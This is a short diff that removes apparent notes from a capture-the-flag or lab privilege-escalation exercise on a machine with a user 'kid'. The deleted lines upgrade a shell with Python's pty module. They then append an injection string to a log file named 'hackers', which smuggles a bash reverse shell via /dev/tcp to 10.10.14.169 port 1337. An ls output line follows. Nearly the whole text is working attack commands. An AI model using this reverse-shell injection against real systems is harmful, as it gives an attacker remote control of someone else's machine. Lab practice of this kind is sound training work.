@@ -1,9 +1,0 @@
-python3 -c "import pty;pty.spawn('/bin/bash')"
-
-cd home/kid/logs
-
-ls -la
-
-echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.169/1337 0>&1' #" >> hackers
-
--rw-rw-r--  1 kid pwn    0 Jun  4 19:01 hackers
